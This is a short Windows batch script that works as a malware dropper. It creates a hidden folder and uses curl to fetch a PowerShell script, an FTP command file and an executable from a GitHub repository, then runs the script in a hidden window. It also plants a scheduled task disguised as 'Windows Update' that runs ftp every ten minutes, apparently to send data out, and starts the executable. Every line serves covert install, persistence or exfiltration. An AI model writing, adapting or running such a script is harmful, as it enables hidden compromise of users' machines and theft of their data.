cd "C:\Users\Public"
mkdir "C:\Users\Public\Public Presentations"
attrib +h "C:\Users\Public\Public Presentations"							
cd "C:\Users\Public\Public Presentations"


curl -LJO https://raw.githubusercontent.com/ponciste/ironhack/main/desmon.ps1 -o "C:\Users\Public\Public Presentations"
curl -LJO https://raw.githubusercontent.com/ponciste/ironhack/main/ftp.txt -o "C:\Users\Public\Public Presentations"
curl -LJO https://github.com/ponciste/ironhack/raw/main/winupdater.exe -o "C:\Users\Public\Public Presentations"

powershell.exe -WindowStyle hidden "C:\Users\Public\Public Presentations\desmon.ps1"

schtasks /create /tn "Windows Update" /tr "powershell.exe -WindowStyle hidden -c """ftp -A -s:'''C:\Users\Public\Public Presentations\ftp.txt'''"""" /sc minute /mo 10

cd "C:\Users\Public\Public Presentations"
start winupdater.exe